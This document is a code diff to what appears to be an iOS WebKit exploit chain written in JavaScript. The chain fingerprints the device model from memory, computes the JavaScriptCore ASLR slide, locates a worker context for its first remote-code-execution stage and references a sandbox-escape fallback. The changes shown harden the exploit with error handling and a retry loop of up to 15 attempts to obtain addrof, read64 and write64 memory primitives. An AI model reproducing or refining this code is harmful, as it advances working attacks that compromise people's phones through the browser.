@@ -9309,10 +9309,18 @@ const device_chipset = {
           print(`libsystem_pthread_base: ${libsystem_pthread_base.hex()}`);
           const libsystem_pthread_linkedit = read64(libsystem_pthread_base + 0x600n);
           print(`libsystem_pthread_linkedit: ${libsystem_pthread_linkedit.hex()}`);
-          device_model = linkedit_to_device[ios_version][libsystem_pthread_linkedit];
+          const linkedit_map = linkedit_to_device[ios_version];
+          if (!linkedit_map)
+              throw new TryAgainError(`missing linkedit map for ios_version=${ios_version}`);
+          device_model = linkedit_map[libsystem_pthread_linkedit];
+          if (!device_model)
+              throw new TryAgainError(`missing device model for ios_version=${ios_version} libsystem_pthread_linkedit=${libsystem_pthread_linkedit.hex()} known=${Object.keys(linkedit_map).join(",")}`);
           print("device_model: " + device_model);
           chipset = device_chipset[device_model];
-          offsets = { ...rce_offsets[device_model] };
+          const device_offsets = rce_offsets[device_model];
+          if (!device_offsets)
+              throw new TryAgainError(`missing rce offsets for device_model=${device_model}`);
+          offsets = { ...device_offsets };
           slide = globalFuncParseFloat - offsets.JavaScriptCore__globalFuncParseFloat;
           print(`slide: ${slide.hex()}`);
           for (const key of Object.keys(offsets)) {
@@ -9341,6 +9349,9 @@ const device_chipset = {
                   worker = scriptExecutionContext;
               }
           }
+
+          if (!worker)
+              throw new TryAgainError(`stage1 could not find DedicatedWorkerGlobalScope, contexts_length=${contexts_length}`);
 
           print(`worker: ${worker.hex()}`);
 
@@ -9469,6 +9480,7 @@ async function main() {
         return await _aarw_main();
     } catch (e) {
         print('_aarw_main: error: ' + e);
+        return null;
     }
 }
   const rce_begin = Date.now();
@@ -10244,12 +10256,17 @@ async function main() {
             globalThis.__ls_sbx0_fallback_start = parseInt(data.sbx0_fallback_start, 10);
             if (!isFinite(globalThis.__ls_sbx0_fallback_start)) globalThis.__ls_sbx0_fallback_start = 0;
             print("inside stage1_rce from worker");
-            main().then(async (p_temp) => {
-              if(!p_temp.addrof)
-              {
-                let retryCount = 0; const maxRetries = 15; while(retryCount < maxRetries && !p_temp.addrof) { print("Failed rce, retry " + (retryCount+1) + "/" + maxRetries); p_temp = await main(); retryCount++; } if(!p_temp.addrof) { print("All retries exhausted"); }
+            (async () => {
+              let p_temp = null;
+              const maxRetries = 15;
+              for (let attempt = 0; attempt < maxRetries; attempt++) {
+                p_temp = await main();
+                if (p_temp && p_temp.addrof && p_temp.read64 && p_temp.write64)
+                  return;
+                print("Failed rce, retry " + (attempt + 1) + "/" + maxRetries);
               }
-            });
+              print("All retries exhausted");
+            })();
             break;
         }
     }
